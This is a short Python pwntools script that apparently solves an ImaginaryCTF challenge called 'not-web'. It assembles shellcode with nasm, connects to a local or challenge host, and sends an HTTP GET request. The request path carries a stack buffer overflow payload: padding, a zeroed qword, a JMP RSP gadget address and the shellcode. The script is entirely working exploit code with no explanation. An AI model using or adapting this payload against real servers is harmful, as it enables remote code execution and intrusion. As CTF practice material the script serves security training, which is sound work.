#!/bin/python

from pwn import *

import os

os.system('nasm shellcode.asm')

io = remote('localhost', 8080)
#io = remote('not-web.chal.imaginaryctf.org', 42042)

JMP_RSP = 0x40105e

shellcode = open('shellcode', 'rb').read()

io.sendline(
        b'GET /' +
        b'A' * 160 +
        b'\x00\x00\x00\x00\x00\x00\x00\x00' +
        b'A' * 0x40 +
        p64(JMP_RSP) +
        shellcode +
        b'D' * 350 +
        b' HTTP'
)

